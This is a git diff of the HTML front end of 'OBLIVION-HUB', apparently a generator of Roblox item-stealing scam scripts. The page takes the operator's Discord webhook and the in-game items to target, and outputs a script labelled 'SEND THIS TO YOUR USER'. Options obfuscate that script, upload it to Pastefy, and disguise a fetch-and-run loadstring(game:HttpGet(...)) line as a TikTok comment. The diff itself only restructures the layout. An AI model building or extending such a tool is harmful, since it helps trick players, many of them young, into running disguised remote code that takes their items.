@@ -10,137 +10,165 @@
     <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-    <div id="app">
-        <header>
-            <h1>OBLIVION-HUB</h1>
-            <div class="header-glow"></div>
-            <button id="signInBtn" class="sign-in-btn">SIGN IN</button>
-            <button id="tiktokBtn" class="sign-in-btn" style="margin-left: 8px;">TIKTOK COMMENT</button>
-        </header>
+    <!-- ========== MAIN VIEW ========== -->
+    <div id="mainView">
+        <div id="app">
+            <header>
+                <h1>OBLIVION-HUB</h1>
+                <div class="header-glow"></div>
+                <button id="signInBtn" class="sign-in-btn">SIGN IN</button>
+                <button id="tiktokBtn" class="sign-in-btn" style="margin-left: 8px;">TIKTOK COMMENT</button>
+            </header>
 
-        <section class="input-section">
-            <label>ROBLOX USERNAME</label>
-            <input type="text" id="username" placeholder="Your Username" />
-        </section>
+            <section class="input-section">
+                <label>ROBLOX USERNAME</label>
+                <input type="text" id="username" placeholder="Your Username" />
+            </section>
 
-        <section class="input-section">
-            <label>DISCORD WEBHOOK</label>
-            <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." />
-        </section>
+            <section class="input-section">
+                <label>DISCORD WEBHOOK</label>
+                <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." />
+            </section>
 
-        <section class="mode-section">
-            <span class="mode-label">EXECUTION MODE</span>
-            <div class="mode-buttons">
-                <button class="mode-btn active" data-mode="normal">NORMAL</button>
-                <button class="mode-btn" data-mode="adminpanel">GUI LOADING ADMIN PANEL</button>
-                <button class="mode-btn" data-mode="freezetrade">GUI LOADING FREEZE-TRADE</button>
-                <button class="mode-btn" data-mode="dupespawn">GUI LOADING DUPE/SPAWN</button>
-                <button class="mode-btn" data-mode="custom">CUSTOM</button>
-            </div>
-        </section>
-
-        <section id="secondLoadstring" class="hidden">
-            <label>SECOND LOADSTRING</label>
-            <textarea id="customLoadstring" rows="4" placeholder="Paste your custom code here..."></textarea>
-        </section>
-
-        <!-- Target Brainrots -->
-        <section class="target-section">
-            <div class="section-header">
-                <h2>TARGET BRAINROTS</h2>
-                <span class="counter" id="brainrotsCounter">0 SELECTED</span>
-            </div>
-            <div class="search-bar">
-                <input type="text" id="brainrotsSearch" placeholder="Search..." />
-                <button class="all-btn" id="brainrotsAll">ALL</button>
-                <button class="none-btn" id="brainrotsNone">NONE</button>
-            </div>
-            <div class="rarity-filters">
-                <button class="filter-btn active" data-rarity="all">ALL</button>
-                <button class="filter-btn" data-rarity="Common">Common</button>
-                <button class="filter-btn" data-rarity="Rare">Rare</button>
-                <button class="filter-btn" data-rarity="Epic">Epic</button>
-                <button class="filter-btn" data-rarity="Mythic">Mythic</button>
-                <button class="filter-btn" data-rarity="Legendary">Legendary</button>
-                <button class="filter-btn" data-rarity="Brainrot God">God</button>
-                <button class="filter-btn" data-rarity="Secret">Secret</button>
-                <button class="filter-btn" data-rarity="OG">OG</button>
-                <button class="filter-btn" data-rarity="Recommended">⭐ Recommended</button>
-            </div>
-            <div class="items-container scrollable" id="brainrotsContainer"></div>
-        </section>
-
-        <!-- Target Base Skins -->
-        <section class="target-section">
-            <div class="section-header">
-                <h2>TARGET BASE SKINS</h2>
-                <span class="counter" id="skinsCounter">0 SELECTED</span>
-            </div>
-            <div class="search-bar">
-                <input type="text" id="skinsSearch" placeholder="Search..." />
-                <button class="all-btn" id="skinsAll">ALL</button>
-                <button class="none-btn" id="skinsNone">NONE</button>
-            </div>
-            <div class="items-container scrollable" id="skinsContainer"></div>
-        </section>
-
-        <!-- Target Gears -->
-        <section class="target-section">
-            <div class="section-header">
-                <h2>TARGET GEARS</h2>
-                <span class="counter" id="gearsCounter">0 SELECTED</span>
-            </div>
-            <div class="search-bar">
-                <input type="text" id="gearsSearch" placeholder="Search..." />
-                <button class="all-btn" id="gearsAll">ALL</button>
-                <button class="none-btn" id="gearsNone">NONE</button>
-            </div>
-            <div class="items-container scrollable" id="gearsContainer"></div>
-        </section>
-
-        <!-- Short Loadstring -->
-        <section class="short-loadstring-section" id="shortLoadstringSection">
-            <div class="short-header">
-                <div>
-                    <h2>SHORT LOADSTRING</h2>
-                    <p class="subtitle">USE TINY DATABASE LINK (this method obfuscates the code and sends it to Pastefy)</p>
+            <section class="mode-section">
+                <span class="mode-label">EXECUTION MODE</span>
+                <div class="mode-buttons">
+                    <button class="mode-btn active" data-mode="normal">NORMAL</button>
+                    <button class="mode-btn" data-mode="adminpanel">GUI LOADING ADMIN PANEL</button>
+                    <button class="mode-btn" data-mode="freezetrade">GUI LOADING FREEZE-TRADE</button>
+                    <button class="mode-btn" data-mode="dupespawn">GUI LOADING DUPE/SPAWN</button>
+                    <button class="mode-btn" data-mode="custom">CUSTOM</button>
                 </div>
-                <div class="toggle-switch" id="shortToggle">
-                    <span class="toggle-label off">OFF</span>
-                    <div class="toggle-track">
-                        <span class="toggle-thumb"></span>
+            </section>
+
+            <section id="secondLoadstring" class="hidden">
+                <label>SECOND LOADSTRING</label>
+                <textarea id="customLoadstring" rows="4" placeholder="Paste your custom code here..."></textarea>
+            </section>
+
+            <!-- Target Brainrots -->
+            <section class="target-section">
+                <div class="section-header">
+                    <h2>TARGET BRAINROTS</h2>
+                    <span class="counter" id="brainrotsCounter">0 SELECTED</span>
+                </div>
+                <div class="search-bar">
+                    <input type="text" id="brainrotsSearch" placeholder="Search..." />
+                    <button class="all-btn" id="brainrotsAll">ALL</button>
+                    <button class="none-btn" id="brainrotsNone">NONE</button>
+                </div>
+                <div class="rarity-filters">
+                    <button class="filter-btn active" data-rarity="all">ALL</button>
+                    <button class="filter-btn" data-rarity="Common">Common</button>
+                    <button class="filter-btn" data-rarity="Rare">Rare</button>
+                    <button class="filter-btn" data-rarity="Epic">Epic</button>
+                    <button class="filter-btn" data-rarity="Mythic">Mythic</button>
+                    <button class="filter-btn" data-rarity="Legendary">Legendary</button>
+                    <button class="filter-btn" data-rarity="Brainrot God">God</button>
+                    <button class="filter-btn" data-rarity="Secret">Secret</button>
+                    <button class="filter-btn" data-rarity="OG">OG</button>
+                    <button class="filter-btn" data-rarity="Recommended">⭐ Recommended</button>
+                </div>
+                <div class="items-container scrollable" id="brainrotsContainer"></div>
+            </section>
+
+            <!-- Target Base Skins -->
+            <section class="target-section">
+                <div class="section-header">
+                    <h2>TARGET BASE SKINS</h2>
+                    <span class="counter" id="skinsCounter">0 SELECTED</span>
+                </div>
+                <div class="search-bar">
+                    <input type="text" id="skinsSearch" placeholder="Search..." />
+                    <button class="all-btn" id="skinsAll">ALL</button>
+                    <button class="none-btn" id="skinsNone">NONE</button>
+                </div>
+                <div class="items-container scrollable" id="skinsContainer"></div>
+            </section>
+
+            <!-- Target Gears -->
+            <section class="target-section">
+                <div class="section-header">
+                    <h2>TARGET GEARS</h2>
+                    <span class="counter" id="gearsCounter">0 SELECTED</span>
+                </div>
+                <div class="search-bar">
+                    <input type="text" id="gearsSearch" placeholder="Search..." />
+                    <button class="all-btn" id="gearsAll">ALL</button>
+                    <button class="none-btn" id="gearsNone">NONE</button>
+                </div>
+                <div class="items-container scrollable" id="gearsContainer"></div>
+            </section>
+
+            <!-- Short Loadstring -->
+            <section class="short-loadstring-section" id="shortLoadstringSection">
+                <div class="short-header">
+                    <div>
+                        <h2>SHORT LOADSTRING</h2>
+                        <p class="subtitle">USE TINY DATABASE LINK (this method obfuscates the code and sends it to Pastefy)</p>
+                    </div>
+                    <div class="toggle-switch" id="shortToggle">
+                        <span class="toggle-label off">OFF</span>
+                        <div class="toggle-track">
+                            <span class="toggle-thumb"></span>
+                        </div>
                     </div>
                 </div>
-            </div>
-            <div id="guestLockMessage" class="guest-lock hidden">
-                ⚠️ This feature requires authentication. Please <strong>Sign In</strong> with Discord.
-            </div>
-        </section>
+                <div id="guestLockMessage" class="guest-lock hidden">
+                    ⚠️ This feature requires authentication. Please <strong>Sign In</strong> with Discord.
+                </div>
+            </section>
 
-        <button id="generateBtn">GENERATE SCRIPT</button>
+            <button id="generateBtn">GENERATE SCRIPT</button>
 
-        <section id="outputSection" class="hidden">
-            <div class="output-header">
-                <h2>SEND THIS TO YOUR USER</h2>
-                <button id="copyBtn">COPY</button>
-            </div>
-            <div class="output-container">
-                <pre id="outputCode"></pre>
-            </div>
-        </section>
+            <section id="outputSection" class="hidden">
+                <div class="output-header">
+                    <h2>SEND THIS TO YOUR USER</h2>
+                    <button id="copyBtn">COPY</button>
+                </div>
+                <div class="output-container">
+                    <pre id="outputCode"></pre>
+                </div>
+            </section>
 
-        <!-- Footer -->
-        <footer class="app-footer">
-            <span class="footer-year">2026</span>
-            <span class="footer-separator">·</span>
-            <a href="https://discord.gg/44XUsM4VN8" target="_blank" rel="noopener noreferrer" class="footer-discord-link">
-                <svg class="discord-icon" viewBox="0 0 127.14 96.36" fill="currentColor">
-                    <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83,97.68,97.68,0,0,0-29.11,0A72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.42,68.42,0,0,1-10.85,5.18,77.7,77.7,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.64,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.21,60,73.21,53s5-12.74,11.43-12.74S96.1,46,96.1,53,90.88,65.69,84.69,65.69Z"/>
-                </svg>
-            </a>
-        </footer>
+            <!-- Footer -->
+            <footer class="app-footer">
+                <span class="footer-year">2026</span>
+                <span class="footer-separator">·</span>
+                <a href="https://discord.gg/44XUsM4VN8" target="_blank" rel="noopener noreferrer" class="footer-discord-link">
+                    <svg class="discord-icon" viewBox="0 0 127.14 96.36" fill="currentColor">
+                        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83,97.68,97.68,0,0,0-29.11,0A72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.42,68.42,0,0,1-10.85,5.18,77.7,77.7,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.64,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.21,60,73.21,53s5-12.74,11.43-12.74S96.1,46,96.1,53,90.88,65.69,84.69,65.69Z"/>
+                    </svg>
+                </a>
+            </footer>
+        </div>
     </div>
 
+    <!-- ========== TIKTOK DASHBOARD ========== -->
+    <div id="tiktokDashboard" class="hidden">
+        <div class="dashboard-container">
+            <div class="dashboard-header">
+                <button id="dashboardBackBtn" class="dashboard-back-btn">← BACK</button>
+                <h1>TIKTOK COMMENT DASHBOARD</h1>
+                <div></div> <!-- spacer -->
+            </div>
+            <div class="dashboard-content">
+                <p class="dashboard-subtitle">Paste your script (loadstring) and generate an obfuscated TikTok comment.</p>
+                <div class="tiktok-input-group">
+                    <label>SCRIPT (loadstring):</label>
+                    <textarea id="tiktokInput" rows="3" placeholder="Example: loadstring(game:HttpGet('https://...'))()"></textarea>
+                </div>
+                <button id="tiktokGenerateBtn" class="tiktok-generate-btn">GENERATE</button>
+                <div class="tiktok-output-group">
+                    <label>OUTPUT:</label>
+                    <textarea id="tiktokOutput" rows="5" readonly></textarea>
+                </div>
+                <button id="tiktokCopyBtn" class="tiktok-copy-btn">COPY</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========== MODALS ========== -->
     <!-- Login Modal -->
     <div id="loginModal" class="login-modal hidden">
         <div class="login-modal-content">
@@ -170,27 +198,6 @@
                 <button id="confirmCancelBtn" class="confirm-btn cancel-btn">Cancel</button>
                 <button id="confirmOkBtn" class="confirm-btn ok-btn">Confirm</button>
             </div>
-        </div>
-    </div>
-
-    <!-- TikTok Comment Modal -->
-    <div id="tiktokModal" class="login-modal hidden">
-        <div class="login-modal-content tiktok-modal-content">
-            <div class="login-modal-header">
-                <h2>TIKTOK COMMENT</h2>
-                <button id="closeTiktokBtn" class="close-modal-btn">×</button>
-            </div>
-            <p class="login-modal-subtitle">Paste your script (loadstring) and generate an obfuscated TikTok comment.</p>
-            <div class="tiktok-input-group">
-                <label>SCRIPT (loadstring):</label>
-                <textarea id="tiktokInput" rows="3" placeholder="Example: loadstring(game:HttpGet('https://...'))()"></textarea>
-            </div>
-            <button id="tiktokGenerateBtn" class="tiktok-generate-btn">GENERATE</button>
-            <div class="tiktok-output-group">
-                <label>OUTPUT:</label>
-                <textarea id="tiktokOutput" rows="5" readonly></textarea>
-            </div>
-            <button id="tiktokCopyBtn" class="tiktok-copy-btn">COPY</button>
         </div>
     </div>
 
